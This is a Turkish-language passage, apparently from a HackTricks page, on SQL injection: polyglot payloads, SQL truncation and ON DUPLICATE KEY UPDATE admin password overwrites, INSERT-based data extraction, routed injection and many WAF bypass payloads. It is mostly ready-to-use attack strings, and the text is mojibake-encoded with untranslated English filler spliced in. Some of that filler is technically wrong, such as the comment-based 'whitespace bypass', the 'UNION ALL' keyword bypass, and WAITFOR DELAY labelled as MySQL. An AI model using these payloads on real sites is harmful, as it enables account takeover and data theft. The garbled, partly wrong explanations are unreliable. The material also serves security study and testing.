Polyglot injection, bir SQL enjeksiyon saldÄ±rÄ±sÄ± tekniÄŸidir ve birden fazla veritabanÄ± yÃ¶netim sistemi (DBMS) tarafÄ±ndan yorumlanabilen bir SQL ifadesi oluÅŸturmayÄ± amaÃ§lar. Bu, saldÄ±rganÄ±n farklÄ± DBMS'lerde aynÄ± enjeksiyonu kullanarak birden fazla hedefe saldÄ±rabilmesini saÄŸlar.

Polyglot enjeksiyon, farklÄ± DBMS'lerin farklÄ± yorumlama kurallarÄ±nÄ± kullanarak Ã§alÄ±ÅŸÄ±r. Bu nedenle, saldÄ±rgan, hedef DBMS'ye baÄŸlÄ± olarak uygun bir SQL ifadesi oluÅŸturabilir. Bu teknik, saldÄ±rganÄ±n hedef DBMS'nin tÃ¼rÃ¼nÃ¼ belirlemesine gerek kalmadan saldÄ±rÄ± yapmasÄ±nÄ± saÄŸlar.

Polyglot enjeksiyon, saldÄ±rganÄ±n hedef DBMS'nin tÃ¼rÃ¼nÃ¼ bilmediÄŸi durumlarda Ã¶zellikle kullanÄ±ÅŸlÄ±dÄ±r. Bu teknik, saldÄ±rganÄ±n saldÄ±rÄ± yÃ¼zeyini geniÅŸletmesine ve birden fazla hedefe saldÄ±rmasÄ±na olanak tanÄ±r. Ancak, her DBMS'nin farklÄ± yorumlama kurallarÄ± olduÄŸu iÃ§in, polyglot enjeksiyonun baÅŸarÄ±lÄ± olmasÄ± iÃ§in dikkatli bir ÅŸekilde planlanmasÄ± ve test edilmesi gerekmektedir.
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Insert Ä°fadesi

### Mevcut nesne/kullanÄ±cÄ±nÄ±n ÅŸifresini deÄŸiÅŸtirme

Bunu yapmak iÃ§in, muhtemelen kullanÄ±cÄ±lar iÃ§in **"ana nesne"** olarak adlandÄ±rÄ±lan bir nesne oluÅŸturmayÄ± denemelisiniz (muhtemelen **admin**):

* **AdMIn** adÄ±nda bir kullanÄ±cÄ± oluÅŸturun (bÃ¼yÃ¼k ve kÃ¼Ã§Ã¼k harflerle)
* **admin=** adÄ±nda bir kullanÄ±cÄ± oluÅŸturun
* **SQL KÄ±rpma SaldÄ±rÄ±sÄ±** (kullanÄ±cÄ± adÄ±nda veya e-postada bir **uzunluk sÄ±nÄ±rÄ±** olduÄŸunda) --> **admin \[Ã§ok fazla boÅŸluk]** adÄ±nda bir kullanÄ±cÄ± oluÅŸturun

#### SQL KÄ±rpma SaldÄ±rÄ±sÄ±

VeritabanÄ± savunmasÄ±zsa ve kullanÄ±cÄ± adÄ± iÃ§in maksimum karakter sayÄ±sÄ± Ã¶rneÄŸin 30 ise ve **admin** kullanÄ±cÄ±sÄ±nÄ± taklit etmek istiyorsanÄ±z, "_admin \[30 boÅŸluk] a_" adÄ±nda bir kullanÄ±cÄ± adÄ± oluÅŸturmayÄ± deneyin ve herhangi bir ÅŸifre belirleyin.

VeritabanÄ±, tanÄ±tÄ±lan **kullanÄ±cÄ± adÄ±nÄ±n** veritabanÄ±nda **var olup olmadÄ±ÄŸÄ±nÄ± kontrol edecektir**. EÄŸer **yoksa**, kullanÄ±cÄ± adÄ±nÄ± **maksimum izin verilen karakter sayÄ±sÄ±na kadar kesecek** (bu durumda "_admin \[25 boÅŸluk]_" olacak) ve ardÄ±ndan veritabanÄ±nda kullanÄ±cÄ± "**admin**"i **yeni ÅŸifreyle gÃ¼ncelleyerek** tÃ¼m boÅŸluklarÄ± otomatik olarak kaldÄ±racaktÄ±r (bazÄ± hatalar oluÅŸabilir, ancak bu Ã§alÄ±ÅŸmadÄ±ÄŸÄ± anlamÄ±na gelmez).

Daha fazla bilgi iÃ§in: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_Not: Bu saldÄ±rÄ±, en son MySQL kurulumlarÄ±nda yukarÄ±da aÃ§Ä±klandÄ±ÄŸÄ± gibi artÄ±k Ã§alÄ±ÅŸmayacaktÄ±r. KarÅŸÄ±laÅŸtÄ±rmalar hala varsayÄ±lan olarak sondaki boÅŸluklarÄ± gÃ¶rmezden gelirken, bir alanÄ±n uzunluÄŸundan daha uzun bir dize eklemeye Ã§alÄ±ÅŸmak bir hataya neden olacak ve ekleme baÅŸarÄ±sÄ±z olacaktÄ±r. Bu kontrol hakkÄ±nda daha fazla bilgi iÃ§in: [https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)_

### MySQL Insert zaman tabanlÄ± kontrol

VALUES ifadesinden Ã§Ä±kmak iÃ§in dÃ¼ÅŸÃ¼ndÃ¼ÄŸÃ¼nÃ¼z kadar `','',''` ekleyin. Gecikme gerÃ§ekleÅŸirse, bir SQL Injection'a sahipsiniz.
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

MySQL'deki `ON DUPLICATE KEY UPDATE` ifadesi, bir UNIQUE indeks veya PRIMARY KEY'de yinelenen bir deÄŸer oluÅŸturacak bir satÄ±r eklemeye Ã§alÄ±ÅŸÄ±ldÄ±ÄŸÄ±nda veritabanÄ±nÄ±n alacaÄŸÄ± eylemleri belirtmek iÃ§in kullanÄ±lÄ±r. AÅŸaÄŸÄ±daki Ã¶rnek, bu Ã¶zelliÄŸin bir yÃ¶netici hesabÄ±nÄ±n ÅŸifresini deÄŸiÅŸtirmek amacÄ±yla nasÄ±l istismar edilebileceÄŸini gÃ¶stermektedir:

Ã–rnek Enjeksiyon PayloaÄŸÄ±:

Bir enjeksiyon payloaÄŸÄ± aÅŸaÄŸÄ±daki gibi oluÅŸturulabilir, burada `users` tablosuna iki satÄ±r eklenmeye Ã§alÄ±ÅŸÄ±lÄ±r. Ä°lk satÄ±r bir tuzak, ikinci satÄ±r ise mevcut bir yÃ¶neticinin e-postasÄ±nÄ± hedefleyerek ÅŸifrenin gÃ¼ncellenmesi amacÄ±yla kullanÄ±lÄ±r:
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
Ä°ÅŸleyiÅŸi ÅŸu ÅŸekildedir:

- Sorgu, `generic_user@example.com` iÃ§in bir satÄ±r ve `admin_generic@example.com` iÃ§in baÅŸka bir satÄ±r eklemeye Ã§alÄ±ÅŸÄ±r.
- EÄŸer `admin_generic@example.com` iÃ§in bir satÄ±r zaten mevcutsa, `ON DUPLICATE KEY UPDATE` ifadesi tetiklenir ve MySQL'e mevcut satÄ±rÄ±n `password` alanÄ±nÄ± "bcrypt_hash_of_newpassword" olarak gÃ¼ncellemesi talimatÄ± verilir.
- SonuÃ§ olarak, kimlik doÄŸrulama, "bcrypt_hash_of_newpassword" ile eÅŸleÅŸen ÅŸifreyle `admin_generic@example.com` kullanarak denenebilir. ("bcrypt_hash_of_newpassword", istenen ÅŸifrenin bcrypt hash'inin gerÃ§ek hash ile deÄŸiÅŸtirilmesi gereken yeni ÅŸifrenin bcrypt hash'ini temsil eder).

### Bilgi Ã§Ä±karma

#### AynÄ± anda 2 hesap oluÅŸturma

Yeni bir kullanÄ±cÄ± ve kullanÄ±cÄ± adÄ±, ÅŸifre ve e-posta oluÅŸturmak iÃ§in gereklidir:
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### Onluk veya onaltÄ±lÄ±k kullanma

Bu teknikle sadece 1 hesap oluÅŸturarak bilgi Ã§Ä±karabilirsiniz. UnutulmamasÄ± gereken Ã¶nemli bir nokta, herhangi bir yorum yapmanÄ±za gerek olmadÄ±ÄŸÄ±dÄ±r.

**hex2dec** ve **substr** kullanarak:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
Metni almak iÃ§in ÅŸunu kullanabilirsiniz:
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
**hex** ve **replace** (ve **substr**) kullanarak:
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) Ä°spanya'daki en ilgili siber gÃ¼venlik etkinliÄŸi ve Avrupa'daki en Ã¶nemli etkinliklerden biridir. Teknik bilginin yayÄ±lmasÄ±nÄ± amaÃ§layan bu kongre, her disiplindeki teknoloji ve siber gÃ¼venlik profesyonelleri iÃ§in kaynayan bir buluÅŸma noktasÄ±dÄ±r.

{% embed url="https://www.rootedcon.com/" %}

## Routed SQL enjeksiyonu

Routed SQL enjeksiyonu, enjekte edilebilir sorgunun Ã§Ä±ktÄ±yÄ± veren sorgu olmadÄ±ÄŸÄ± durumlarda ortaya Ã§Ä±kar, ancak enjekte edilebilir sorgunun Ã§Ä±ktÄ±sÄ± Ã§Ä±ktÄ±yÄ± veren sorguya gider. ([Makaleden](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

Ã–rnek:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## WAF GeÃ§iÅŸi

[Ä°lk geÃ§iÅŸler buradan](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### BoÅŸluk geÃ§iÅŸi

BoÅŸluk Yok (%20) - boÅŸluk alternatifleri kullanarak geÃ§iÅŸ yapma
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
# SQL Injection: Whitespace Bypass Using Comments

In some cases, SQL injection payloads may be blocked or filtered based on the presence of whitespace characters. However, it is possible to bypass these restrictions by using comments within the SQL injection payload.

## Technique

To bypass whitespace restrictions, you can use comments to effectively remove the whitespace characters from the payload. The following techniques can be used:

### Single-line Comments

In SQL, single-line comments start with `--` and continue until the end of the line. By using single-line comments, you can remove the whitespace characters from the payload.

For example, consider the following SQL injection payload:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'password'
```

In this payload, the comment `--'` effectively removes the whitespace characters before the `AND` keyword, allowing the injection to bypass the whitespace restriction.

### Multi-line Comments

In SQL, multi-line comments start with `/*` and end with `*/`. By using multi-line comments, you can remove multiple whitespace characters from the payload.

For example, consider the following SQL injection payload:

```sql
SELECT * FROM users WHERE username = 'admin'/* AND password = 'password' */
```

In this payload, the multi-line comment `/* AND password = 'password' */` effectively removes the whitespace characters before and after the `AND` keyword, allowing the injection to bypass the whitespace restriction.

## Conclusion

By using comments within SQL injection payloads, you can bypass whitespace restrictions and successfully execute SQL injection attacks. However, it is important to note that this technique may not work in all scenarios, as it depends on the specific implementation and filtering mechanisms in place.
```sql
?id=1/*comment*/and/**/1=1/**/--
```
# SQL Injection - Bypassing No Whitespace Filters using Parenthesis

When performing SQL injection attacks, it is common for web applications to implement filters that block certain characters, such as whitespaces. These filters are designed to prevent attackers from injecting malicious SQL code into the application.

However, in some cases, it is still possible to bypass these filters and successfully execute SQL injection attacks. One technique to achieve this is by using parentheses.

## Bypassing No Whitespace Filters

Let's assume that the application is filtering whitespaces and does not allow them in user input. For example, the following SQL query is used to retrieve user information:

```sql
SELECT * FROM users WHERE username='[USER_INPUT]' AND password='[PASSWORD]'
```

To bypass the no whitespace filter, we can use parentheses to separate the SQL keywords and concatenate the injected code. Here's an example:

```sql
SELECT * FROM users WHERE username='admin' AND (1=1) OR '1'='1'--' AND password='[PASSWORD]'
```

In this example, we use parentheses to separate the injected code `(1=1) OR '1'='1'` from the rest of the query. The double dash `--` is used to comment out the remaining part of the original query.

By using this technique, we can bypass the no whitespace filter and successfully execute the injected SQL code.

## Conclusion

When faced with a no whitespace filter, using parentheses can be an effective technique to bypass the filter and successfully perform SQL injection attacks. However, it is important to note that each application may have different filters and security measures in place, so it is crucial to thoroughly test and understand the application's behavior before attempting any SQL injection attacks.
```sql
?id=(1)and(1)=(1)--
```
### VirgÃ¼l BypassÄ±

VirgÃ¼l BypassÄ± - OFFSET, FROM ve JOIN kullanarak bypass yapma
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### Genel GeÃ§iÅŸler

Anahtar kelimeleri kullanarak siyah liste - bÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harf kullanarak geÃ§iÅŸ yapma
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
## Blacklist using keywords case insensitive - bypass using an equivalent operator

### Introduction

In some cases, web applications implement a blacklist to prevent SQL injection attacks. This blacklist typically consists of keywords that are commonly associated with SQL injection. However, if the blacklist is implemented in a case-insensitive manner, it can be bypassed using an equivalent operator.

### Bypassing a Case-Insensitive Blacklist

To bypass a case-insensitive blacklist, you can use an equivalent operator that achieves the same result as the blocked keyword. Here are some examples:

- If the keyword "OR" is blocked, you can use the equivalent operator "||" to achieve the same logical operation.
- If the keyword "AND" is blocked, you can use the equivalent operator "&&" to achieve the same logical operation.
- If the keyword "UNION" is blocked, you can use the equivalent operator "UNION ALL" to achieve the same result.

By using these equivalent operators, you can bypass the case-insensitive blacklist and successfully perform SQL injection attacks.

### Conclusion

Implementing a case-insensitive blacklist to prevent SQL injection attacks can be bypassed by using equivalent operators. It is important for web application developers to be aware of this vulnerability and implement proper input validation and parameterized queries to mitigate the risk of SQL injection.
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### Bilimsel GÃ¶sterim WAF atlatma

Bu hile hakkÄ±nda daha detaylÄ± bir aÃ§Ä±klamayÄ± [gosecure blogunda](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/) bulabilirsiniz.\
Temel olarak, bilimsel gÃ¶sterimi beklenmedik ÅŸekillerde kullanarak WAF'Ä± atlayabilirsiniz:
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### SÃ¼tun Ä°simleri KÄ±sÄ±tlamasÄ±nÄ± AÅŸma

Ã–ncelikle, **orijinal sorgu ve bayrak Ã§Ä±karmak istediÄŸiniz tablonun aynÄ± miktarda sÃ¼tuna sahipse**, sadece ÅŸunu yapabilirsiniz: `0 UNION SELECT * FROM flag`

Bir tablonun Ã¼Ã§Ã¼ncÃ¼ sÃ¼tununa **ismini kullanmadan eriÅŸmek mÃ¼mkÃ¼ndÃ¼r**. AÅŸaÄŸÄ±daki gibi bir sorgu kullanarak: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, bu nedenle bir sql enjeksiyonunda ÅŸu ÅŸekilde gÃ¶rÃ¼necektir:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
Veya bir **virgÃ¼l atlatma** kullanarak:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
Bu hile [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/) adresinden alÄ±nmÄ±ÅŸtÄ±r.

### WAF bypass Ã¶neri araÃ§larÄ±

{% embed url="https://github.com/m4ll0k/Atlas" %}

## DiÄŸer KÄ±lavuzlar

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Brute-Force AlgÄ±lama Listesi

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



â€‹

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) Ä°spanya'daki en Ã¶nemli siber gÃ¼venlik etkinliÄŸi ve Avrupa'daki en Ã¶nemli etkinliklerden biridir. Teknik bilginin yayÄ±lmasÄ±nÄ± amaÃ§layan bu kongre, her disiplindeki teknoloji ve siber gÃ¼venlik profesyonelleri iÃ§in kaynayan bir buluÅŸma noktasÄ±dÄ±r.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

* Bir **siber gÃ¼venlik ÅŸirketinde** Ã§alÄ±ÅŸÄ±yor musunuz? **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** ister misiniz? veya **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan Ã¶zel [**NFT'lerimizi**](https://opensea.io/collection/the-peass-family) keÅŸfedin
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
